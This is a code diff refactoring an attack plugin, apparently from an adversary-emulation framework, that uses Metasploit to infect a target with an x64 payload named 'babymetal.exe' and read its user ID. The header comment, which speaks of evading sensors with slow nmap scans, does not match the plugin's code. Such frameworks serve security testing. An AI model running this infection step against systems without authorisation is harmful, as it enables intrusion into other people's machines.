@@ -3,7 +3,6 @@
 # A plugin to nmap targets slow motion, to evade sensors
 
 from plugins.base.attack import AttackPlugin, Requirement
-from app.metasploit import MetasploitInstant
 
 
 class MetasploitGetuidPlugin(AttackPlugin):
@@ -33,18 +32,13 @@ class MetasploitGetuidPlugin(AttackPlugin):
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
-        metasploit = MetasploitInstant(self.metasploit_password,
-                                       attack_logger=self.attack_logger,
-                                       attacker=self.attacker_machine_plugin,
-                                       username=self.metasploit_user)
+        self.metasploit.smart_infect(target,
+                                     payload=payload_type,
+                                     outfile=payload_name,
+                                     format="exe",
+                                     architecture="x64")
 
-        metasploit.smart_infect(target,
-                                payload=payload_type,
-                                outfile=payload_name,
-                                format="exe",
-                                architecture="x64")
-
-        uid = metasploit.getuid(target)
+        uid = self.metasploit.getuid(target)
         print(f"UID: {uid}")
 
         return res
